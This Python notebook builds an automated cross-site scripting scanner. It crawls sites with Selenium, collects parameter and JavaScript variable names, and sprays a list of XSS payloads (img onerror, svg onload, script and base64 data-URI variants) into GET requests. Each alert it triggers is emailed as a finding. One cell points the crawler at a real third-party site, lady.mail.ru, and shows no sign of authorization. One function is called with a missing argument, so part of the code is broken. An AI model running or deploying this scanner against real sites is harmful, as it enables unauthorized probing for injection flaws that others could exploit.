{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {
    "scrolled": true
   },
   "outputs": [],
   "source": [
    "import settings\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "import re\n",
    "import time\n",
    "import json\n",
    "import smtplib\n",
    "import selenium\n",
    "import lxml.html as html\n",
    "\n",
    "from urlparse import urlparse\n",
    "from selenium import webdriver\n",
    "from selenium.common.exceptions import *\n",
    "\n",
    "from email.header import Header\n",
    "from email.message import Message\n",
    "from email.mime.multipart import MIMEMultipart\n",
    "from email.mime.text import MIMEText\n",
    "\n",
    "import settings\n",
    "import argparse\n",
    "\n",
    "from settings import logger\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "driver = webdriver.Chrome(settings.chrome_path, chrome_options=settings.chrome_options) \n",
    "redis_conn = settings.redis_conn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "js_var_extractors = [\n",
    "                     re.compile(r\"([a-zA-Z_]\\w*)\\[([a-zA-Z_]\\w*)*\\w*\\]\"), # array regexp\n",
    "                     re.compile(r\"var\\s+([a-zA-Z_]\\w*)\"),                 # var name regexp   \n",
    "                     re.compile(r\"([a-zA-Z_]\\w*)\\.([a-zA-Z_]\\w*)\\.*\"),    # class hierarchy\n",
    "                     re.compile(r\"([a-zA-Z_]\\w*)\\s*=\\s*\\w\"),              # name = value\n",
    "                     re.compile(r\"\\w+\\s*=\\s*([a-zA-Z_]\\w*)\"),             # smth = name \n",
    "                     re.compile(r'''[\\\"\\']([a-zA-Z_]\\w*)[\\\"\\']:[\\\"\\']\\w*[\\\"\\']''') # \"name\":\"value\"\n",
    "                    ]\n",
    "\n",
    "js_keywords = set([\n",
    "                        'abstract','arguments','boolean','break','byte',\n",
    "                        'case','catch','char','class*','const',\n",
    "                        'continue','debugger','default','delete','do',\n",
    "                        'double','else','enum*','eval','export*',\n",
    "                        'extends*','false','final','finally','float',\n",
    "                        'for','function','goto','if','implements',\n",
    "                        'import','in','instanceof','int','interface',\n",
    "                        'let','long','native','new','null',\n",
    "                        'package','private','protected','public','return',\n",
    "                        'short','static','super*','switch','synchronized',\n",
    "                        'this','throw','throws','transient','true',\n",
    "                        'try','typeof','var','void','volatile',\n",
    "                        'while','with','yield'\n",
    "                    ])\n",
    "\n",
    "js_datatypes = set([\"Array\", \"Date\" ,\"function\",\n",
    "                    \"hasOwnProperty\", \"Infinity\",\"isFinite\", \"isNaN\",\n",
    "                    \"isPrototypeOf\",\"Math\",\"NaN\",\n",
    "                    \"Number\",\"Object\",\"prototype\"\n",
    "                    \"String\",\"toString\",\"undefined\",\"valueOf\"])\n",
    "\n",
    "js_keywords.update(js_datatypes)\n",
    "\n",
    "reserved_keywords = set([\"alert\", \"all\", \"anchor\", \"anchors\",\n",
    "                         \"area\", \"assign\", \"blur\", \"button\",\n",
    "                         \"checkbox\", \"clearInterval\", \"clearTimeout\", \"clientInformation\",\n",
    "                         \"close\", \"closed\", \"confirm\",\"constructor\",\n",
    "                         \"crypto\", \"decodeURI\", \"decodeURIComponent\", \"defaultStatus\",\n",
    "                         \"document\",\"element\",\"elements\", \"embed\",\n",
    "                         \"embeds\",\"encodeURI\",\"encodeURIComponent\",\"escape\",\n",
    "                         \"event\",\"fileUpload\",\"focus\",\"form\",\n",
    "                         \"forms\",\"frame\",\"innerHeight\",\"innerWidth\",\n",
    "                         \"layer\",\"layers\",\"link\",\"location\",\n",
    "                         \"mimeTypes\",\"navigate\",\"navigator\",\"frames\",\n",
    "                         \"frameRate\",\"hidden\", \"history\", \"image\",\n",
    "                         \"images\",\"offscreenBuffering\",\"open\",\"opener\",\n",
    "                         \"option\",\"outerHeight\",\"outerWidth\",\"packages\",\n",
    "                         \"pageXOffset\",\"pageYOffset\",\"parent\",\"parseFloat\",\n",
    "                         \"parseInt\",\"password\",\"pkcs11\",\"plugin\",\n",
    "                         \"prompt\",\"propertyIsEnum\", \"radio\",\"reset\",\n",
    "                         \"screenX\",\"screenY\",\"scroll\",\"secure\",\n",
    "                         \"select\",\"self\",\"setInterval\",\"setTimeout\",\n",
    "                         \"status\",\"submit\",\"taint\",\"text\",\n",
    "                         \"textarea\",\"top\",\"unescape\",\"untaint\",\"window\"])\n",
    "\n",
    "reserved_small = set([\"alert\",\"innerHTML\",\"self\",\"setTimeout\",\"window\",\"clearTimeout\"])\n",
    "js_keywords.update(reserved_small)\n",
    "\n",
    "\n",
    "xss_payloads = ['''<img src=x id/=' onerror=alert(1)//'>''',\n",
    "                '''<svg onload=alert(1)>''',\n",
    "                '''<img src=x onerror=alert(1)>''',\n",
    "                '''<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"></object>''',\n",
    "                '''data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==''',\n",
    "                '''PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==''',\n",
    "                '''javascript:alert(1)''',\n",
    "                '''<script>alert(1)</script>''',\n",
    "                '''<script>alert(1)<\\/script>''',\n",
    "                '''\"`><img src=xx onerror=alert(1)//\">''',\n",
    "                '''\"><img src=xx onerror=alert(1)//\">''',\n",
    "                '''alert(1);''']\n",
    "\n",
    "payload_alerts = set(\"1\")\n",
    "\n",
    "content_ext = \".jpg.png.gif.bmp.svg.ico.js.css\"\n",
    "\n",
    "def extract_jsvar_fast(script):\n",
    "    vlist = list()\n",
    "    for regexp in js_var_extractors:\n",
    "        for match in re.findall(regexp,script):\n",
    "            for vname in match:\n",
    "                vlist.append(vname)\n",
    "\n",
    "    return set(vlist)\n",
    "\n",
    "def reset_driver():\n",
    "    global driver\n",
    "    global redis_conn\n",
    "    \n",
    "    if driver:\n",
    "        driver.quit()\n",
    "\n",
    "    driver = webdriver.Chrome(settings.chrome_path , chrome_options=settings.chrome_options) \n",
    "    driver_cookies = redis_conn.get('crawler/cookie')\n",
    "\n",
    "    if driver_cookies:\n",
    "        try:\n",
    "            driver.get(\"https://ya.ru\") # Hack, couldnot set up cookie other way\n",
    "            driver_cookies = json.loads(driver_cookies)\n",
    "            for cookie in driver_cookies:\n",
    "                driver.add_cookie(cookie)\n",
    "        except:\n",
    "            logger.info(\"Cookie was not loaded\")\n",
    "\n",
    "def send_report(user_email,password,mail_to,subject,data,server_name):\n",
    "    server = smtplib.SMTP_SSL(server_name)\n",
    "    server.login(user_email, password)\n",
    "    mail_from = user_email\n",
    "    msg = MIMEMultipart()\n",
    "\n",
    "    msg[\"Subject\"] = Header(subject,\"utf-8\")\n",
    "    msg[\"From\"] = mail_from\n",
    "    msg[\"To\"] = mail_to\n",
    "\n",
    "    msg_text = MIMEText(data.encode(\"utf-8\"), \"plain\", \"utf-8\")\n",
    "    msg.attach(msg_text)\n",
    "    \n",
    "    logger.info(\"Sending mail to {}\".format(mail_to))\n",
    "    server.sendmail(mail_from , mail_to, msg.as_string())\n",
    "    server.quit()\n",
    "\n",
    "def notify(data, subject):\n",
    "    email = settings.email\n",
    "    password = settings.password \n",
    "    target_email = settings.target_email\n",
    "    smtp_server = settings.smtp_server\n",
    "    \n",
    "    send_report(email,password,target_email,subject, data,smtp_server)\n",
    "\n",
    "def check_url(redis_conn, url):\n",
    "    if redis_conn.get(\"\".join((\"crawler/queue/\", url))) != None:\n",
    "        return False\n",
    "    if redis_conn.get(\"\".join((\"crawler/processing/\", url))) != None:\n",
    "        return False\n",
    "    if redis_conn.get(\"\".join((\"crawler/done/\", url))) != None:\n",
    "        return False\n",
    "    return True\n",
    "\n",
    "class InvalidUrlException(Exception):\n",
    "    pass\n",
    "\n",
    "def extract_links(parsed_url, doc, domains):\n",
    "    page_links = []\n",
    "    page_links += doc.xpath(\".//*/@href\")\n",
    "    page_links += doc.xpath(\".//*/@src\")\n",
    "    page_links += doc.xpath(\".//*/@action\")\n",
    "\n",
    "    links = set()\n",
    "    params = set()\n",
    "    param_vars = list()\n",
    "\n",
    "    for link in page_links:\n",
    "        in_domains = False\n",
    "        for domain in domains:\n",
    "            if link.find(domain) != -1:\n",
    "                in_domains = True\n",
    "        if in_domains == False:\n",
    "            continue\n",
    "\n",
    "        tmp = link.split('?')\n",
    "        if len(tmp) > 1:\n",
    "            params.add(tmp[1])\n",
    "            \n",
    "        main_part = tmp[0]\n",
    "        main_part.strip().split('#')[0]\n",
    "    \n",
    "        if content_ext.find(main_part.split('.')[-1]) == -1:\n",
    "            if main_part.startswith('http') == False:\n",
    "                if main_part.startswith('//'):\n",
    "                    main_part = \"\".join((parsed_url.scheme,'://',main_part[2:]))\n",
    "                else:\n",
    "                    if main_part.startswith('/'):\n",
    "                        main_part = \"\".join((parsed_url.scheme,'://', parsed_url.netloc, main_part))\n",
    "\n",
    "        links.add(main_part)\n",
    "\n",
    "        for p in list(params):\n",
    "            tmp = p.split('&')\n",
    "            for i in tmp:\n",
    "                param_vars.append(i.split('=')[0])\n",
    "\n",
    "    return links, param_vars   \n",
    "    \n",
    "\n",
    "def process_url(url, task ,worker_name):\n",
    "    parsed_url = urlparse(url)\n",
    "\n",
    "    task_params = dict()\n",
    "    task_params[\"worker\"] = str(worker_name)\n",
    "    task_params[\"crawler\"] = task[\"crawler\"] # inherit crawler\n",
    "    task_params[\"extract_js\"] = task[\"extract_js\"] # and js extractor parameters\n",
    "    task_params[\"params\"] = \"\"\n",
    "    task_params = json.dumps(task_params)\n",
    "\n",
    "    logger.info(\"Url: {} \\nUse crawler: {}\\nUse extractor: {}\".format(url, task[\"crawler\"], task[\"extract_js\"]))\n",
    "\n",
    "    try:\n",
    "        driver.get(url)\n",
    "        doc = html.fromstring(driver.page_source)\n",
    "\n",
    "    except UnexpectedAlertPresentException:\n",
    "        alert = driver.switch_to.alert\n",
    "        alert.accept()\n",
    "        doc = html.fromstring(driver.page_source)\n",
    "        logger.info(\"Unexpected alert on url: {}\".format(url))\n",
    "\n",
    "    except:\n",
    "        reset_driver()\n",
    "        driver.get(url)\n",
    "        doc = html.fromstring(driver.page_source)\n",
    "        logger.info(\"236: Exception on url: {}\".format(url))\n",
    "\n",
    "    all_variables = set()\n",
    "\n",
    "    if task[\"crawler\"] == True:\n",
    "        domains = set()\n",
    "        for domain in redis_conn.scan_iter(\"crawler/domains/*\"):\n",
    "            domain = domain.replace(\"crawler/domains/\",\"\")\n",
    "            domains.add(domain)\n",
    "\n",
    "        links, param_vars = extract_links(doc, domains)\n",
    "        all_variables.update(set(param_vars))\n",
    "        for link in links:\n",
    "            if check_url(redis_conn, link):\n",
    "                redis_conn.set(\"\".join((\"crawler/queue/\", link)), task_params)\n",
    "    \n",
    "    if task[\"extract_js\"] == True: # extract varnames from js\n",
    "        doc_scripts = doc.xpath(\".//script/text()\")\n",
    "        for script in doc_scripts:\n",
    "            all_variables.update(extract_jsvar_fast(script))\n",
    "\n",
    "    for var in redis_conn.scan_iter(\"crawler/variables/*\"): # load varnames from redis\n",
    "        var = var.replace(\"crawler/variables/\",\"\")\n",
    "        all_variables.add(var)\n",
    "\n",
    "    xss_requests = []\n",
    "    req = \"\".join((url,\"?\"))\n",
    "\n",
    "    # Generate payloads\n",
    "    for payload in xss_payloads:\n",
    "        for var in all_variables:\n",
    "            tmp = \"\".join((var,\"=\",payload,\"&\"))\n",
    "            if len(req) + len(tmp) > settings.maxurllen:\n",
    "                xss_requests.append(req[:-1])\n",
    "                req = \"\".join((url,\"?\"))\n",
    "                req += tmp\n",
    "            else:\n",
    "                req += tmp\n",
    "\n",
    "    # Do requests\n",
    "    for req in xss_requests:\n",
    "        try:\n",
    "            driver.get(req)\n",
    "        except UnexpectedAlertPresentException:\n",
    "            alert = driver.switch_to.alert\n",
    "            data = \"Alert {} was found on {}\".format(alert.text,req)\n",
    "            notify(data=data,subject=\"XSS was found!\")\n",
    "            logger.info(data)\n",
    "\n",
    "            alert.accept()\n",
    "            driver.get(req)\n",
    "            \n",
    "        except:\n",
    "            logger.info(\"289: Exception on url: {}\".format(req))\n",
    "            reset_driver()\n",
    "        \n",
    "    try:\n",
    "        alert = driver.switch_to.alert\n",
    "        data = \"Alert {} was found on {}\".format(alert.text,req)\n",
    "        notify(data=data,subject=\"XSS was found!\")\n",
    "        alert.accept()\n",
    "\n",
    "    except:\n",
    "        logger.info(\"302: Exception on url: {}\".format(req))\n",
    "        reset_driver()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [],
   "source": [
    "try:\n",
    "    driver.get(\"https://lady.mail.ru\")\n",
    "    doc = html.fromstring(driver.page_source)\n",
    "\n",
    "except UnexpectedAlertPresentException:\n",
    "    alert = driver.switch_to.alert\n",
    "    alert.accept()\n",
    "    doc = html.fromstring(driver.page_source)\n",
    "    print \"Unexpected alert on url: {}\".format(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "reset_driver()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set(['https://lady.mail.ru/rubric/love/', 'https://lady.mail.ru/stars/', 'https://images.lady.mail.ru/share_image/page/2/', 'https://lady.mail.ru/rubric/horoscope/', 'http://www.viber.com/lady.mail.ru', 'https://lady.mail.ru/cookery/', 'https://lady.mail.ru/cookery/recipe/', 'https://lady.mail.ru/', 'https://lady.mail.ru/rubric/seks-18/', 'https://lady.mail.ru/cookery/week/', 'https://images.lady.mail.ru/848278/', 'https://lady.mail.ru/rubric/tests/', 'https://lady.mail.ru/rubric/beauty/', 'https://lady.mail.ru/rubric/o-vazhnom/', 'https://lady.mail.ru/rubric/puteshestvija/', 'https://lady.mail.ru/rubric/highfashion/', 'https://lady.mail.ru/advice/list/', 'https://r.mail.ru/cls1074201/auth.mail.ru/cgi-bin/logout', 'https://r.mail.ru/cls951827/e.mail.ru/login', 'https://lady.mail.ru/rubric/high-life/', 'https://lady.mail.ru/rubric/cooking-ideas/', 'https://lady.mail.ru/policy/', 'https://images.lady.mail.ru/848254/', 'https://images.lady.mail.ru/847817/', 'https://images.lady.mail.ru/848167/', 'https://lady.mail.ru/around-life/', 'https://www.instagram.com/lady.mail.ru/ ', 'https://lady.mail.ru/product/', 'https://lady.mail.ru/forum/', 'https://lady.mail.ru/calorie-calc/', 'https://images.lady.mail.ru/848106/', 'https://lady.mail.ru/editorialstaff/', 'https://bestblogger.lady.mail.ru/', 'https://lady.mail.ru/rubric/success-story/', 'https://lady.mail.ru/rubric/news/', 'https://lady.mail.ru/rubric/interview/', 'https://lady.mail.ru', 'https://www.facebook.com/lady.mail.ru', 'https://lady.mail.ru/love/'])\n"
     ]
    }
   ],
   "source": [
    "parsed_url = urlparse(\"https://lady.mail.ru\")\n",
    "domains = set()\n",
    "for domain in redis_conn.scan_iter(\"crawler/domains/*\"):\n",
    "    domain = domain.replace(\"crawler/domains/\",\"\")\n",
    "    domains.add(domain)\n",
    "    \n",
    "links, param_vars = extract_links(parsed_url,doc,domains)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "def main():\n",
    "    parser = argparse.ArgumentParser(description='xss scanner worker')\n",
    "    parser.add_argument('--name', type=str, default=\"Noname\")\n",
    "    args = parser.parse_args()\n",
    "\n",
    "    worker_name = args.name\n",
    "\n",
    "    while True:\n",
    "        try:\n",
    "            key = next(redis_conn.scan_iter(\"crawler/queue/*\"))\n",
    "        except StopIteration:\n",
    "            time.sleep(5.0)\n",
    "            continue\n",
    "        \n",
    "        task = json.loads(redis_conn.get(key))\n",
    "        url = key.replace(\"crawler/queue/\",\"\")\n",
    "        processing_key = \"\".join((\"crawler/processing/\", url))\n",
    "\n",
    "        redis_conn.set(processing_key, str(worker_name))\n",
    "        redis_conn.delete(key)\n",
    "\n",
    "        try:\n",
    "            process_url(url,task, worker_name)\n",
    "            redis_conn.delete(processing_key)\n",
    "            redis_conn.set(\"\".join((\"crawler/done/\",url)), str(worker_name))\n",
    " \n",
    "        except KeyboardInterrupt:\n",
    "            if driver:\n",
    "                driver.quit()\n",
    "                redis_conn.delete(processing_key)\n",
    "                redis_conn.set(key, json.dumps(task))\n",
    "            return\n",
    "\n",
    "        except: #TODO Add smarter exception handler\n",
    "            logger.info(\"Error on url: {}\".format(url))\n",
    "            redis_conn.delete(processing_key)\n",
    "            #redis_conn.set(key, json.dumps(task))\n",
    "            reset_driver()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 2",
   "language": "python",
   "name": "python2"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
